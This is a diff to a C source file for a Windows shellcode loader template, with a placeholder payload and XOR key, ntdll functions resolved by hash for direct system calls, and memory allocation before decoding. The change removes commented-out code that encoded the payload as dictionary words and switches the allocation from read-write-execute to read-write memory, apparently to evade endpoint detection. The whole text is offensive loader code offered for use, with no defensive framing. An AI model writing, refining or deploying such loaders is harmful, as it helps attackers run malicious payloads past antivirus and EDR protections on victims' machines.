@@ -184,6 +184,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     LPSTR lpCmdLine, int nCmdShow) {
     
     unsigned char payload[] = "%SHELLCODE%";
+    SIZE_T regionSize = sizeof(payload);
     BYTE key = %XOR_KEY%;
     PVOID exec = NULL;
     DWORD old_protect = 0;
@@ -205,41 +206,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)CustomGetProcAdress(hNtdll, create_thread_hash);
     NtWaitForSingleObj _NtWaitForSingleObj = (NtWaitForSingleObj)CustomGetProcAdress(hNtdll, wait_for_single_object_hash);
 
-    
-    
-    
-    // XORing shellcode
-    // int assoc_size = sizeof(tableau) / sizeof(tableau[0]);
-
-    // unsigned char payload[TAILLE] = {0};
-    // int result_index = 0;
-
-    // // Dupliquer la chaîne pour la tokeniser
-    // char buffer[TAILLE*8];
-    // strcpy(buffer, message);
-
-    // // Découper la chaîne en mots
-    // char *token = strtok(buffer, " ");
-    // while (token != NULL) {
-    //     for (int i = 0; i < assoc_size; i++) {
-    //         if (strcmp(token, tableau[i].mot) == 0) {
-    //             payload[result_index++] = tableau[i].octet;
-    //             break;
-    //         }
-    //     }
-    //     token = strtok(NULL, " ");
-    // } 
-
-    // unsigned char *payload = DICT_decrypt(message);
-
-    SIZE_T regionSize = sizeof(payload);
-
-
 
     // Allocating executable memory
-    // Calculer la valeur de PAGE_READWRITE de manière obfusquée
-    ULONG readWriteProtection = 1 + 1 + 2;  // Cela donne 0x04 (PAGE_READWRITE)
-    _NtAlocVirtMem((HANDLE)-1, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    _NtAlocVirtMem((HANDLE)-1, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     XOR(payload,sizeof(payload),key);
 
